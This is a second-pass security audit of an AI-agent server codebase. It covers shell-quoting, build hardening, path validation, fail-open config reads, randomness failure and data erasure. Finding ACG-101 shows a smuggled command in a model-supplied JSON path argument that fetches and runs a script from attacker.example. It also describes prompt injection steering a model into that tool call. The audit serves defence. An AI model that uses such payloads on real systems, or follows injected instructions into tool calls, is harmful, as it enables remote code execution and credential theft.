# Proposal: Security, compliance, audibility and governance audit — second-pass findings

- **State:** pending; companion to
  [the primary audit](security-compliance-audibility-governance-audit-2026-08-26.md).
- **Audit baseline:** `origin/testing` at
  `a01a71c495fdb10a28821b154242cb7d0eb1d271` (2026-08-26) — the same commit as the primary
  audit, reviewed independently.
- **Relationship to the primary audit:** this document is an **independent second pass over the
  same commit**, run concurrently and without visibility into the ACG ledger until after its own
  sweep completed. It is deliberately kept separate rather than merged so the two passes remain
  attributable; the ledgers should be reconciled into one document before this proposal is
  actioned. IDs are numbered from 101 to avoid collision.
- **Method:** identical evidence rules, severity model and scope inventory as the primary audit.
  They are not restated here.
- **Owner:** unassigned.

## Why a second pass produced different findings

The two passes overlap on four items and diverge on nine. The divergence is informative, not
accidental: the primary pass entered through **deployment and dependency surfaces** (shipped
compose topologies, workflow pinning, Go module versions, DB1 bootstrap), and the second pass
entered through **in-process enforcement primitives** (the shell-quoting helper, the path
validator, the config accessor layer, the CSPRNG). Neither entry point sees the other's findings.

The practical conclusion for the assurance program: a single audit lens over a codebase this size
systematically misses whole classes. The reconciliation should preserve both lenses rather than
choosing one.

## Reconciliation against the ACG ledger

The primary ledger stood at 10 findings when this pass completed its sweep and had grown to 25
by the time this document was written. The table below is stated against the **25-item ledger**.

| This pass | Disposition |
| --- | --- |
| WORM default-off | **Defer to ACG-002**, which is deeper on loss and backpressure. One addendum below. |
| SBOM / signing / provenance | **Defer to ACG-004**, which covers it plus mutable action pinning. |
| Dependency scanning in CI | **Defer to ACG-004 / ACG-005.** Only the *sanitizer, SAST and secret-scanning* half of the CI gap is filed here, as ACG-102. |
| Zero-valued sentinel on failure | **Related to ACG-006**, different subsystem. Filed as ACG-105 with an explicit shared-rule cross-reference. |
| `docs/SECURITY.md` overstatement | **Defer to ACG-025**, whose claim-registry remedy is the stronger fix. The *understatement* direction, which ACG-025 does not cover, is retained as an addendum below rather than as a finding. |
| Path validation weakness | Filed as ACG-103. **Adjacent to ACG-013**, which is a reachable exploit of the same class found independently; see the cross-reference in ACG-103. |
| ACG-101, ACG-102, ACG-104, ACG-105, ACG-106 | Net new; filed below. |

## Finding ledger — second pass

| ID | Severity | Domain | Finding | Status |
| --- | --- | --- | --- | --- |
| [ACG-101](#acg-101) | Critical | Tool containment / injection | `shell_escape()` does not quote; ~20 unquoted call sites give model-controlled RCE on aimee-server with the forge credential in scope | verified; release-blocking |
| [ACG-102](#acg-102) | High | Secure development | C hardening depends on toolchain defaults, and no broad sanitizer, SAST, or secret-scanning job is required in CI | verified |
| [ACG-103](#acg-103) | Medium | Tool / workspace containment | `guardrails_validate_file_path` is a sensitive-path deny-list, not workspace confinement, and ignores its own bounds parameter | verified |
| [ACG-104](#acg-104) | Medium | Governance / policy resolution | Generated config accessors cannot distinguish "off" from "config authority unreachable"; security flags fail open | verified |
| [ACG-105](#acg-105) | Medium | Credential custody / audit attribution | CSPRNG failure fails open to a constant, colliding identifier on session, artifact, trigger and ingress paths | verified |
| [ACG-106](#acg-106) | Medium | Data protection, retention, deletion | No data-subject erasure and no content retention control, despite the security document instructing operators to configure one | verified |

Second-pass net-new total after the deferrals above: **1 critical, 1 high, 4 medium.** Combined
with the 25-item primary ledger (1 critical, 10 high, 13 medium, 1 low), the reconciled total is
**2 critical, 11 high, 17 medium, 1 low — 31 findings**.

The second Critical is ACG-101, which the primary pass did not reach.

## What holds

Recorded because the primary audit's ledger, read alone, understates the codebase. These are
verified passes, not absences of evidence:

- **SQL is parameterised throughout.** The DB2 layer runs a named-placeholder rewriter onto
  `PQexecParams` (`src/modules/db2/c/db_postgres.c`); the two `IN (%s)` constructions found
  (`kb_service_backend.c:788`, `memory_query.c:582`) interpolate *placeholders and a static
  subquery*, never values. No SQL injection was found anywhere in the tree.
- **Credential comparison is constant-time.** Bearer matching routes through `server_ct_equal` →
  `aimee_core_credential_equal` (`src/server/server_http_identity.c:60`,
  `src/server/server_auth.c:291`), and `src/server/server_bearer_auth.c:375` deliberately
  declines to short-circuit on a primary match so primary, enrolled and invalid credentials cost
  the same.
- **Security-critical randomness fails closed.** PKCE verifiers, OIDC login secrets, enrolment
  tokens and OAuth CSRF state all `return -1` on CSPRNG failure (`src/server/oauth_pkce.c:87`,
  `src/kb/kb_oidc_login.c:107`, `src/kb/enroll.c:33`,
  `src/modules/git/git_oauth_github.c:135`). ACG-105 records where that discipline stops.
- **Delegate sandboxing fails closed with no host fallback.** `workspace_turn_bind_container`
  (`src/modules/workspace/workspace_turn.c:520-560`) refuses on every failure path rather than
  degrading to in-process execution; `workspace_turn_workspace_authorized` canonicalises with
  `realpath` before checking registered roots, explicitly rejects `/` as a root, and uses a
  correct boundary-aware prefix test (`cwd_in_workspace`, `:47`).
- **Privilege is dropped in the server container.** `deploy/container/server-entrypoint.sh:548`
  execs the server as `aimee` via `runuser`; it does not run as root.
- **Log hygiene is good.** Every `LOG_*` call site mentioning token / secret / credential /
  password reports names, fingerprints and return codes — no secret values.
- **The self-check culture is real.** `src/Makefile` carries ~90 bespoke `*-check` targets,
  including `git-cred-centralized-check` and `sanitizer-callsites-check`. ACG-102 is about what
  those checks are not wired to, not about their absence.

## Findings

<a id="acg-101"></a>
### ACG-101 — Critical — `shell_escape()` does not quote, and ~20 call sites interpolate it unquoted

- **Control objective:** an untrusted tool argument must not reach a command interpreter, and a
  model must not obtain execution inside the process that custodies credentials.

- **Evidence.** `shell_escape()` (`src/util.c:956`) escapes `'` as `'\''` and returns the body
  **without surrounding quotes**:

  ```c
  char *shell_escape(const char *raw)      /* src/util.c:956 */
  {
     ...
     for (size_t i = 0; i < len; i++)
        if (raw[i] == '\'') { esc[j++]='\''; esc[j++]='\\'; esc[j++]='\''; esc[j++]='\''; }
        else                  esc[j++] = raw[i];
     ...
  }
  ```

  Its implicit contract is therefore *"safe only when the caller writes `'%s'`"*. That contract is
  stated nowhere, and it is violated at roughly twenty interpolation sites. An input containing no
  `'` — `` /tmp; id; # `` — passes through completely unchanged.

  The reachable sink is the git MCP repository resolver:

  ```c
  static int mcp_git_candidate_root(const char *candidate, ...)  /* mcp_git_query.c:347 */
  {
     char *esc = shell_escape(candidate);
     snprintf(git_cmd, sizeof(git_cmd),
              "git -C %s rev-parse --show-toplevel 2>/dev/null", esc);   /* bare %s */
     char *out = mcp_git_run(git_cmd, &rc);
  }
  ```

  `candidate` is a **model-supplied MCP tool argument**: `args["path"]`, added as the first and
  authoritative candidate at `src/modules/git/mcp_git_query.c:982`, with `args["cwd"]` as a second
  path at `:1015`. `mcp_git_run()` executes through `run_cmd*` → `popen()` (`src/util.c:690`),
  i.e. `/bin/sh -c`.

- **Failure condition.** A model — including one steered by prompt injection carried in retrieved
  text, a repository file, or an MCP tool result, all three of which `docs/SECURITY.md` declares
  hostile — calls any aimee git MCP tool with:

  ```json
  {"path": "/tmp; curl -s https://attacker.example/x.sh | sh; #"}
  ```

  The resolver builds `git -C /tmp; curl -s https://attacker.example/x.sh | sh; # rev-parse
  --show-toplevel` and hands it to `popen()`. Arbitrary code executes on aimee-server. No
  operator misconfiguration is required; this is the default tool path.

- **Impact.** Three multipliers make this Critical rather than High:

  1. **The injected shell inherits a live forge credential.** `mcp_git_run()` deliberately runs
     git on the server with `GH_TOKEN` and the `GIT_ASKPASS` shim injected into the child
     environment (`mcp_git_query.c:100-121`, via `git_cred_inject_build_env_for_repo`). This
     defeats the stated guarantee that "agent credentials are resolved inside the server and are
     not returned to workflows or delegates" — the model never *receives* the credential, it
     achieves execution in the process that holds it, which is strictly worse.
  2. **It lands on the trusted side of the sandbox boundary.** The comment at
     `mcp_git_query.c:69-81` documents that git tooling is routed to aimee-server *specifically*
     to keep it out of the `--network none`, no-credential delegate sandbox. The injection
     therefore executes exactly where the sandbox exists to prevent execution, with network
     access.
  3. **On the documented managed deployment it reaches host root.**
     `compose.server-managed.yaml:208` bind-mounts `/var/run/docker.sock`, and
     `deploy/container/server-entrypoint.sh:492-504` grants the `aimee` service user that
     socket's group. `docs/SECURITY.md` accepts "anyone who controls that server can control the
     Docker host" as a deployment trade-off — but that sentence assumes control of the server is
     itself gated. ACG-101 removes the gate: one tool argument from a prompt-injected model
     suffices. This also compounds ACG-001: an unauthenticated KB owner surface and a
     model-reachable RCE on the server are reachable from different directions into the same
     deployment.

- **Other unquoted sites confirmed** (same helper, same shell backing):

  | File | Lines | Format |
  | --- | --- | --- |
  | `src/modules/git/mcp_git_query.c` | 356, plus the `rev-parse` / `--git-common-dir` helpers | `git -C %s …` |
  | `src/index.c` | 287, 295, 301, 488, 498, 506, 658, 703, 722 | `git -C %s …`, `find %s …` |
  | `src/modules/db2/c/canonical_index.c` | 711, 719, 725, 892, 900, 906, 1033, 1072, 1087 | `git -C %s …`, `find %s …` |
  | `src/util.c` | 715, 739 | `cd %s && %s` |
  | `src/server/cli_session_pty.c` | 209 | `tmux attach -t %s` |

- **Compensating controls and residual risk.** None on this path. Roughly 90 of the 110
  `shell_escape` call sites *do* write `'%s'` and are correct — `git_forge_vault.c:96`,
  `mcp_git_branch.c` throughout, `server_pipeline.c`. This is the shape of a latent trap rather
  than an absence of care: the helper is right most of the time, which is precisely why the
  exceptions survived review.

- **Required change / owner.** Platform Security and Tooling:

  1. **Required for the sink:** stop building shell strings for git.
     `safe_exec_capture_cwd_env_timeout()` already exists in `src/util.c` and takes an `argv`
     vector; route `mcp_git_run` and the `index.c` / `canonical_index.c` git calls through it, so
     no shell is involved and no quoting contract can be violated.
  2. For sites that must remain shell-backed, make `shell_escape()` emit a **fully quoted** token
     — returning `'…'` including delimiters — and rename it `shell_quote()`, so every call site
     is revisited by the compiler rather than by reviewer attention. Update the ~90 correct sites
     to drop their now-doubled quotes in the same change.
  3. Add a `shell-quote-check` target beside the existing `git-cred-centralized-check`, wired
     into required CI.
  4. Independently of quoting, validate `args["path"]` and `args["cwd"]` against the assigned
     workspace root before use. `docs/SECURITY.md` claims "path checks use canonical workspace
     roots"; this resolver performs no such check. The machinery already exists —
     `workspace_turn_workspace_authorized` does exactly this correctly for the sandbox path.

- **Acceptance tests.**
  - `shell_quote("a'b;c")` round-trips through `/bin/sh -c` as the single literal argument
    `a'b;c`.
  - A git MCP tool called with `{"path": "/tmp; touch /tmp/aimee-injection-canary; #"}` leaves no
    canary file and returns a refusal.
  - `make -C src shell-quote-check` reports zero bare-`%s` interpolations of an escaped value.
  - `mcp_git_candidate_root` refuses a `path` outside every registered workspace root.

- **Rollout constraint.** Change 1 must not wait for change 2. The rename is the durable fix; the
  sink is the live one, and it is release-blocking on its own.

<a id="acg-102"></a>
### ACG-102 — High — hardening depends on toolchain defaults, and broad sanitizer/SAST gates are absent

- **Control objective:** exploitable memory-safety defects are detected before release, and those
  that ship are made materially harder to exploit.

- **Evidence (a) — hardening.** The single `C_FLAGS` line that builds all ~872k lines of
  first-party C (`src/Makefile:110`):

  ```make
  C_FLAGS = -Os -flto -ffunction-sections -fdata-sections -Wl,--gc-sections -s \
            -Wall -Wextra -Werror -Wno-unused-parameter -Wno-format-truncation \
            -Wno-unused-result -MMD -MP …
  ```

  No checked-in release profile explicitly requires `-D_FORTIFY_SOURCE=3`,
  `-fstack-protector-strong`, `-fstack-clash-protection`, `-fPIE -pie`, full RELRO
  (`-Wl,-z,relro,-z,now`), `-Wl,-z,noexecstack`, `-Wformat-security`, or
  `-fcf-protection`. A direct build on the audit host demonstrates why the distinction matters:
  the host toolchain supplies PIE, a non-executable stack and partial RELRO by default, but the
  resulting stripped `aimee-server` has no `BIND_NOW`, stack-canary or fortified-libc imports.
  Another supported compiler/distribution can silently produce a weaker artifact because the
  repository neither requests nor verifies these properties.

  Two flags actively work against this audit:

  - `-Wno-format-truncation` suppresses exactly the diagnostic class that matters given how much
    of this codebase builds shell commands and paths with `snprintf` into fixed buffers. A
    silently truncated quoted shell argument is a security-relevant failure — see ACG-101 — and
    the compiler is being told not to mention it. `index.c:240` and `code_collect.c:240` show the
    codebase *does* check truncation by hand where someone remembered to.
  - `-s` strips symbols from shipped binaries, degrading the crash forensics that
    `src/shutdown_forensics.c` exists to perform.

- **Evidence (b) — detection.** The repository has a standalone witness-gate TSan Make target and
  a second bus-arena TSan script, but neither appears in the required workflows. There is no broad
  ASan/UBSan build of the native unit suite or fuzz targets. `src/Makefile` defines
  `static-analysis`, `cppcheck` and `clang-tidy` targets; none appears in any of the 18 workflows.
  `fuzz-nightly.yml` intends to run randomized inputs, which is useful when operational, but it
  neither adds ASan/UBSan nor preserves nonzero target results (and ACG-024 shows the workflow
  currently fails before the fuzz run). A secret scanner is also absent on every PR.

- **Impact.** ~872k lines of C parse hostile input without a repository-enforced stack-canary,
  full-RELRO or fortified-libc contract and without a broad memory-error detector in the required
  test or fuzz pipeline. The resulting exploit resistance varies with the build host, and many
  memory-safety defects can escape the present gates. Note the
  asymmetry with the product's own promise: `docs/SECURITY.md` states "the OSV gate checks known
  vulnerabilities and can block an unhealthy package" for *MCP packages the user installs*.

- **Scope note.** The dependency-scanning and artifact-provenance halves of the CI gap are
  **deferred to ACG-004 and ACG-005** and are not re-filed here. This finding covers binary
  hardening, sanitizers, SAST and secret scanning only.

- **Required change / owner.** Build & Release:

  1. Add a hardened release profile: `-D_FORTIFY_SOURCE=3 -fstack-protector-strong
     -fstack-clash-protection -fPIE -pie -Wl,-z,relro,-z,now -Wl,-z,noexecstack
     -Wformat-security -fcf-protection=full`. Measure the size delta against the `-Os` goal.
  2. Remove `-Wno-format-truncation` and fix the resulting sites; where truncation is genuinely
     intended, say so with an explicit length check as `index.c:240` already does.
  3. Ship debug symbols as a separate artifact rather than `-s`.
  4. Add a required CI job running the existing unit-test shards under
     `-fsanitize=address,undefined`, and build the fuzz targets with sanitizers. This is the
     highest-yield item in this finding.
  5. Wire `static-analysis` / `cppcheck` / `clang-tidy` into the `lint` job.
  6. Add a secret scanner on every PR.

- **Acceptance tests.**
  - `checksec` on the shipped `aimee-server` reports RELRO=full, PIE, stack canaries, NX and
    fortified functions present.
  - A required CI job named `sanitizers` runs the unit-test shards green under ASan+UBSan.
  - `make -C src fuzz` builds with `-fsanitize=address,undefined,fuzzer`.
  - A PR containing a test credential fails CI.

<a id="acg-103"></a>
### ACG-103 — Medium — `guardrails_validate_file_path` is a deny-list, not workspace confinement, and ignores its own bounds parameter

- **Control objective:** a tool write cannot escape the assigned workspace authority, and a
  validation helper's signature does not misrepresent what it enforces.

- **Cross-reference.** ACG-013 (`skill.show` cross-workspace reads) is a *reachable exploit* of
  this same class, found independently by the primary pass on the read side. This finding is the
  *shared helper* on the write side. They should be remediated under one invariant — resolve
  beneath an authorized root with no symlink following, using directory FDs and
  `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` — rather than patched separately. That two
  independent passes each found a distinct instance is the strongest available evidence that the
  path-authorization layer needs one owner and one primitive, not per-call-site fixes.

- **Evidence.** `docs/SECURITY.md` states: "Path checks use canonical workspace roots. A symlink,
  `..`, alternate spelling, or client-local path must not escape the assigned authority."

  `guardrails_validate_file_path` (`src/modules/guardrails/guardrails.c:619`) — the function
  thirteen tool implementations call to validate a path — does not check workspace roots at all.
  It rejects literal `..` spellings, `realpath`s the input, and tests the result against a
  **substring deny-list** of sensitive paths. A path that resolves anywhere on the host outside
  that list passes. Three specific defects:

  1. **The bounds parameter is a lie.** The signature is
     `(const char *path, char *resolved_buf, size_t resolved_len)`, and `resolved_len` is **never
     referenced in the body**. `realpath(path, resolved_buf)` writes up to `PATH_MAX`. Today every
     caller passes `char resolved[MAX_PATH_LEN]` and `MAX_PATH_LEN == 4096 == PATH_MAX` on Linux,
     so nothing overflows — but the function accepts a size it does not honour. The first caller
     to pass a smaller buffer, or the first port to a platform where `PATH_MAX > MAX_PATH_LEN`,
     gets a stack overflow with no diagnostic. This interacts directly with ACG-102: without
     `-fstack-protector-strong`, that overflow is unmitigated.
  2. **For a file that does not yet exist, the final path component is dropped from the check.**
     When `realpath` fails, the function truncates to the parent directory, resolves *that* into
     `resolved_buf`, and deny-list-checks the parent string. A deny-list entry naming a filename
     rather than a directory therefore does not apply to creating that file.
  3. **The trailing comment claims a check that is not made.** Lines 654-656 read "Check for
     symlink escape: resolved path should not point into a sensitive directory even if the
     original path looked benign. Compare against the same deny list (already done above on the
     resolved path)." A deny-list on the resolved path is not a symlink-escape check; escape
     *from the workspace root* is not tested anywhere in this function.

- **Compensating controls and residual risk.** Real workspace confinement lives elsewhere and is
  stronger. `agent_tools_session_isolation_blocks` (`src/server/agent_tools.c:219`) normalises the
  path, requires it under a managed worktree, defaults to 1, and re-defaults to 1 on config-read
  failure. `classify_path` (`guardrails.c:451`) does check the basename and is called from
  `guardrails_orchestrator.c:1742`, covering tools routed through `pre_tool_check`. Tools calling
  `guardrails_validate_file_path` directly are not covered by defect 2. Residual risk is therefore
  defence-in-depth erosion rather than a demonstrated escape — but the weaker of two layers is
  exactly where defence in depth is decided.

- **Required change / owner.** Tooling & Guardrails:
  1. Honour `resolved_len`: resolve into a local `PATH_MAX` buffer, bounds-check the copy out, and
     return an error on overflow.
  2. Deny-list the basename as well as the resolved parent on the not-yet-exists path, or have
     this function call `classify_path` so there is one sensitivity decision rather than two.
  3. Either add a workspace-root containment test here, or rename the function to
     `guardrails_check_sensitive_path` and correct the trailing comment, so no future caller
     mistakes it for the confinement boundary.

- **Acceptance tests.**
  - A caller passing a 256-byte `resolved_buf` with a 3000-byte resolved path receives an error,
    not a smash.
  - Creating a non-existent `.env` in a permitted directory is denied by the same code path that
    denies overwriting an existing one.

<a id="acg-104"></a>
### ACG-104 — Medium — generated config accessors cannot distinguish "off" from "config authority unreachable"

- **Control objective:** a security control's failure mode is its safe state, and one setting has
  one default.

- **Evidence.** Every generated boolean accessor across
  `src/config_client_accessors_0.c` … `_7.c` (~380 of them) has this shape:

  ```c
  int config_require_session_worktree(void)      /* config_client_accessors_3.c:54 */
  {
     double value = 0;
     (void)config_client_read_number("require_session_worktree", &value);
     return (int)value;
  }
  ```

  The read's return value is discarded. "Explicitly false", "never set", and "the config authority
  is down / the transport failed" are indistinguishable, and all resolve to the permissive value
  for a flag whose safe state is on.

- **Failure condition.** This is established as live rather than theoretical by the codebase
  itself. `src/server/agent_tools.c:223-228` bypasses the generated accessor specifically to avoid
  it, with a comment naming the failure exactly:

  > Fail closed if the independently running config authority is unavailable. Its generated
  > convenience accessor returns zero for both explicit false and transport failure, which would
  > silently disable isolation.

  The session-isolation control was rescued by hand at one call site. The generator that produced
  the trap was not changed, and ~380 accessors still carry it — among them
  `config_integrity_enabled` (the anti-injection gate), `config_cross_verify` and
  `config_roundtable_replay_verify_enabled`. As a direct consequence the two accessors for
  `require_session_worktree` now disagree by construction: the generated one defaults to 0, while
  the client-side attention guard (`src/cli_attention_guard.c:572`) defaults to 1.

- **Impact.** A transient config-authority outage silently downgrades enforcement posture across
  an unknown subset of controls, with no diagnostic and no audit record of the downgrade. This is
  the same class of defect as ACG-002 and ACG-006: a failure that is indistinguishable from a
  normal, permissive result.

- **Required change / owner.** Config & Governance:
  1. Change the generator to emit a failure-aware form — `int config_x(int default_on_failure)`,
     or a paired `config_x_read(int *out)` returning a status — and make security-relevant flags
     pass their safe default explicitly.
  2. Until then, add a `config-failopen-check` target enumerating the security-relevant keys and
     asserting each is read through a fail-closed call site rather than the generated convenience
     accessor.
  3. Delete the divergent `config_require_session_worktree` / `config_set_require_session_worktree`
     pair, or point it at the fail-closed reader, so one setting does not have two accessors with
     opposite defaults.

- **Acceptance tests.**
  - With the config authority stopped, `agent_tools_session_isolation_blocks` and
    `config_integrity_enabled` both report their *safe* state, not their zero state.
  - `make -C src config-failopen-check` passes, and fails on a reintroduced permissive read.

<a id="acg-105"></a>
### ACG-105 — Medium — CSPRNG failure fails open to a constant, colliding identifier

- **Control objective:** identifiers that key session isolation, artifact custody and audit
  attribution are unique, and randomness failure is never silently absorbed.

- **Cross-reference.** ACG-006 records a zero-valued sentinel written into an audit *hash* field
  on key failure. This finding is the same anti-pattern in a different subsystem: a zero-valued
  sentinel written into an *identifier* on entropy failure. They should be remediated under one
  rule — **no security-relevant field may be filled with a constant on failure** — and tested
  together.

- **Evidence.** The CSPRNG is `fopen("/dev/urandom")` + `fread`
  (`src/posix/platform_random.c:5`):

  ```c
  int platform_random_bytes(void *buf, size_t len)
  {
     FILE *f = fopen("/dev/urandom", "r");
     if (!f) return -1;
     size_t n = fread(buf, 1, len, f);
     fclose(f);
     return (n == len) ? 0 : -1;
  }
  ```

  Failure is not exotic. `fopen` fails under file-descriptor exhaustion (`EMFILE`/`ENFILE`) — a
  state a busy server reaches — and in any container built with a minimal `/dev`, which is
  precisely the direction the delegate sandbox posture pushes. `getrandom(2)` would avoid both.

  Failure handling splits three ways across the 13 call sites:

  | Behaviour on CSPRNG failure | Sites |
  | --- | --- |
  | `return -1` (correct) | `oauth_pkce.c:87`, `kb_oidc_login.c:107`, `kb/enroll.c:33`, `git_oauth_github.c:135`, `workspace.c:406`, `cli_mcp_serve.c:314` |
  | `memset(raw, 0, …)` — emit a **constant** id | `session_id.c:45`, `server_auth.c:303`, `ingress_preinject.c:56`, `db2/c/artifacts.c:29` |
  | Seed an LCG from `time()`/`pid` — emit a **predictable** id | `cli_launch.c:84`, `cmd_agent_delegate.c:75`, `server_trigger.c:37` |

- **Impact.** The zeroing branch is worse than random: it does not merely weaken the identifier, it
  makes **every** identifier generated under the failure identical
  (`00000000-0000-0000-0000-000000000000`). Session ids key session state, branch ownership and
  audit attribution; artifact ids key stored artifacts. A total collapse of the id space means
  concurrent sessions silently share state and the audit trail attributes their actions to one
  another — a direct hit on the `docs/SECURITY.md` claim that "audit records keep the originating
  principal when work crosses a delegate, workflow, KB, or tool boundary."

- **Required change / owner.** Runtime & Audit:
  1. Reimplement `platform_random_bytes` on `getrandom(2)`, retaining `/dev/urandom` only as a
     fallback for kernels lacking it, removing the descriptor dependency.
  2. Make identifier generation fail closed as token generation already does. A session that
     cannot obtain a unique id must not proceed under a shared one.
  3. Delete the LCG fallbacks. A predictable identifier is not a graceful degradation.

- **Acceptance tests.**
  - With `platform_random_bytes` forced to fail, session, artifact, trigger and ingress id
    generation each return an error; none returns a constant or a `time()`-derived value.
  - `platform_random_bytes` succeeds with all file descriptors exhausted.
  - The shared rule with ACG-006 is asserted: no security-relevant field is populated with a
    constant on failure.

<a id="acg-106"></a>
### ACG-106 — Medium — no data-subject erasure, and no content retention control

- **Control objective:** durable personal data has a bounded lifetime, a documented classification,
  and can be deleted on request with an audit record of what was deleted.

- **Evidence.** `docs/SECURITY.md` instructs operators: "Memory and document ingestion can retain
  sensitive source text. Scope the KB, **configure retention**, and avoid sending restricted
  evidence to an external synthesis provider."

  There is no retention control to configure. A search of `docs/gen/configuration.md` for
  retention/TTL keys returns `learning_proposal_ttl_days`,
  `memory_typed_facts_speculative_ttl_days`, `kb.purge_fence_ttl_s`, `AIMEE_KB_CACHE_TTL_S` and
  `AIMEE_WORKFLOW_LEASE_TTL_SECS` — TTLs on speculative facts, proposals, a purge fence, a cache
  and a lease. None of them bounds how long ingested document text, memory content, conversation
  history or audit rows are kept. The only `--retention-days` flag in the CLI is on `aimee index`
  (`src/cmd_index.c:204`) and governs code-index lifecycle, not content.

  Separately, there is **no per-principal erasure operation**. Purge is scoped to a project
  (`aimee index purge`, `db2_kb_service_clear_current_project`), not to a data subject. DB2 holds
  memories, documents, conversation history and audit rows keyed by principal; a request to erase
  one person's data cannot be executed with the tools that exist.

- **Impact.** For a product whose premise is durable cross-session memory of a user's work, this is
  the gap most likely to be raised first in any privacy review, and it blocks the primary audit's
  own completion gate: *"Every durable data category has documented classification, scope,
  retention, deletion, backup, restore, and audit behavior."*

- **Design notes that belong in the decision, not the backlog.**
  - **Erasure and WORM are in genuine tension.** An append-only hash-chained store cannot delete a
    row without breaking the chain. The standard resolution is crypto-shredding: store erasable
    content under a per-subject key, keep the chain over ciphertext and hashes, and erase by
    destroying the key. This must be decided **before** ACG-002 makes the chain default-on, not
    discovered afterwards.
  - **At-rest encryption is undocumented outside the vault.** `docs/STORAGE_TIERS.md` and
    `docs/DEPLOYMENT.md` contain no encryption guidance. The vault has real custody options
    (TPM 2, PKCS#11, KMS); DB1, DB2 and the audit log have none stated, so an operator cannot tell
    whether at-rest protection is expected from them or from the platform. This compounds ACG-008.

- **Required change / owner.** Data & Privacy:
  1. Add content retention policy: per-class maximum age (document text, memory content,
     conversation history, audit rows) with a scheduled reaper and an audited deletion record.
     Until it exists, remove "configure retention" from `docs/SECURITY.md` — the document must not
     instruct an operator to use a control that is absent.
  2. Add `aimee kb erase-subject <principal>` spanning memories, documents, history and derived
     vectors, emitting an audited, itemised completion record.
  3. Decide and document the erasure/WORM resolution, sequenced before ACG-002's remediation.
  4. State the at-rest expectation for DB1, DB2 and the audit log in `docs/STORAGE_TIERS.md`, even
     if the answer is "provide it at the volume layer."

- **Acceptance tests.**
  - `aimee kb erase-subject` removes a principal's rows across every store and leaves a verifiable
    audit record of what was removed.
  - After the retention age elapses, a reaper deletes the corresponding content and records the
    deletion.
  - `aimee audit verify` still verifies across an erasure boundary.

## Addenda to existing findings

**To ACG-025 (published guarantees not release-qualified).** ACG-025 catalogues where
`docs/SECURITY.md` claims *more* than the code delivers. This pass found the opposite direction as
well, and a claim registry should capture both or it will institutionalise the understatement:

- The trust-boundary table reads "delegate → host | **process or container** isolation, resource
  limits, explicit mounts and egress." Both alternatives are stale.
  `workspace_turn_bind_container` (`src/modules/workspace/workspace_turn.c:520-560`) has removed the
  in-process path entirely — "There is no second execution model to fall back to, so every failure
  below refuses (-1)" — and `delegate_sandbox_require_isolation` is documented in
  `docs/gen/configuration.md:54` as a deprecated, ignored key. The shipped posture is
  *unconditional container isolation with no host fallback*, which is materially stronger than the
  document claims. An understated control is a lost assurance credit: a reviewer reading the
  current text would score this boundary lower than the code earns.
- The registry's schema should therefore record, per claim, both `enforcement_owner` and
  `stronger_than_stated` — so drift is detected in either direction by the same CI check.

**To ACG-002 (WORM default-off).** Two evidence items this pass adds, neither changing the
severity:

- `src/tests/test_db2_runtime_config_support.c:8` asserts `config_audit_worm_enabled() == 0` as the
  expected default. Default-off is therefore intentional and test-locked, not incidental — the
  remediation must change a test, which is worth knowing before scheduling it.
- The operator-facing consequence deserves its own acceptance test: an operator following the
  Operator checklist in `docs/SECURITY.md` runs `aimee audit verify`, receives a **pass on an
  empty chain**, and reasonably concludes the tamper-evidence guarantee holds. Until the default
  flips, `aimee audit verify` must exit non-zero with "chain disabled — nothing verified" rather
  than succeeding.

## Cross-cutting observation

ACG-101, ACG-104 and ACG-105 — and, from the primary ledger, ACG-002 and ACG-006 — share one
shape, and naming it predicts where the next finding will be: **a correct control with a
permissive failure mode, applied inconsistently across call sites.**

`shell_escape` is right at 90 of 110 sites. The CSPRNG is right on every token path and wrong on
every identifier path. The config accessor was fixed by hand at the one call site someone audited,
and left unfixed at ~380 others. The audit hash writes a sentinel that looks like a hash. In every
case the exception is invisible at the call site — the defective code *looks* like the correct
code, which is why review did not catch it and why the same review will not catch the next one.

That is an argument for mechanical enforcement over reviewer attention, which is why every
remediation above proposes a `*-check` target rather than a guideline. The repository's ~90
existing checks show this is already the house style; these are the places the style was not
applied.

## Residual audit scope

Not reviewed at line level by this pass, and not claimed as clean by it:

- the event-bus arena implementation;
- the Go workflow engine and control plane (`server-go`, ~29k lines) beyond dependency posture;
- the browser / webchat CSRF and session surface;
- the KB management token and JWKS verification path (partially covered by ACG-007);
- Windows and macOS platform backends;
- detection, incident response, backup and recovery, which need deployment evidence rather than
  source evidence.

## Slice placement

This document does not propose a competing programme. The primary audit owns the slice plan; these
findings should be placed into it as follows, and only two placements are load-bearing:

| Finding | Placement | Rationale |
| --- | --- | --- |
| **ACG-101** change 1 (`argv` execution + workspace validation for the MCP git sink) | **Release-blocking, beside ACG-001** | It is the second Critical and is reachable from the default tool path with no operator misconfiguration. It must not wait for the `shell_quote` rename. |
| ACG-101 changes 2-4 (`shell_quote` rename, all ~110 call sites, `shell-quote-check`) | With the other trap-removal work | The durable fix; sequence after the sink is closed. |
| ACG-102 sanitizers, SAST, secret scanning | Before any memory-safety remediation slice | Without a memory-error detector, fixes in ~872k lines of C cannot be validated. |
| ACG-102 hardening flags | With the ACG-004 / ACG-009 supply-chain slice | Same build-and-release owner. |
| ACG-103 | **With ACG-013, not separately** | One invariant, one primitive; see the cross-reference in ACG-103. |
| ACG-104 | With the ACG-002 / ACG-006 fail-open work | Same anti-pattern, same owner. |
| ACG-105 | **Jointly with ACG-006** | One rule: no security-relevant field is filled with a constant on failure. |
| ACG-106 | **Must precede** the ACG-002 default-on chain | The crypto-shredding decision has to be made before the chain starts writing rows that cannot later be erased. This is the one hard ordering constraint this document adds. |

The ACG-106-before-ACG-002 constraint is the item most likely to be lost in reconciliation, and the
most expensive to discover late: every governed-action row written after the chain goes default-on,
but before an erasure design exists, is permanently unerasable.
